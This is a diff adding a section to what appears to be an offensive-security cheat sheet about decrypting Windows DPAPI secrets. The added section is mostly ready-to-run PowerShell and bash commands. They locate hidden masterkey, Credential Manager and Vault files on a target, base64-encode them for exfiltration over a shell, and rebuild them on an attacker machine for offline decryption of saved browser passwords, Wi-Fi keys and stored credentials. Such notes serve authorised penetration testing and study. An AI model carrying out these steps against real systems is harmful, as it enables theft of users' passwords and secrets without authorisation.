@@ -546,6 +546,46 @@ EXEC ('EXEC (''SELECT SYSTEM_USER'') AT [NEXT_LINKED_SERVER]') AT [LINKED_SERVER
 
 Decrypt Windows DPAPI-protected secrets: browser saved passwords, credential manager, Wi-Fi keys, and anything else encrypted with a masterkey. The masterkey is encrypted with the user's password (or the domain backup key for domain accounts).
 
+### Extracting the Files from the Target
+
+`dpapi.py` runs on your attacker box, so you first need to pull the **encrypted masterkey** and the **target blob** (credential file, vault, Chrome data) off the Windows host. These all live in hidden directories: list them with `-Force` or they look empty.
+
+```powershell wrap
+# Your SID — matches the folder name under Protect\
+whoami /user
+
+# gci = Get-ChildItem; -force reveals hidden + system items
+# Masterkey files (GUID-named) — one of these encrypts the blob
+gci -force C:\Users\$USER\AppData\Roaming\Microsoft\Protect\$SID\
+
+# Credential Manager blobs (check both Roaming and Local)
+gci -force C:\Users\$USER\AppData\Roaming\Microsoft\Credentials\
+gci -force C:\Users\$USER\AppData\Local\Microsoft\Credentials\
+
+# Vault directories
+gci -force C:\Users\$USER\AppData\Local\Microsoft\Vault\
+```
+
+Exfil each file by base64-encoding it on the target and decoding on the attacker: no SMB share or file server needed, works over any shell.
+
+```powershell wrap
+# On the target — encrypted masterkey
+[Convert]::ToBase64String([System.IO.File]::ReadAllBytes("C:\Users\$USER\AppData\Roaming\Microsoft\Protect\$SID\$GUID"))
+
+# On the target — credential blob (different GUID)
+[Convert]::ToBase64String([System.IO.File]::ReadAllBytes("C:\Users\$USER\AppData\Roaming\Microsoft\Credentials\$GUID"))
+```
+
+```bash wrap
+# On the attacker — decode each string back into a file
+echo "<base64>" | base64 -d > masterkey
+echo "<base64>" | base64 -d > dpapi.blob
+```
+
+<Tip>
+Run `dpapi.py credential -file dpapi.blob` with no key first: it parses the header and prints the **masterkey GUID** the blob needs, so you know which file to grab from `Protect\$SID\`.
+</Tip>
+
 ### Masterkeys
 
 ```bash wrap
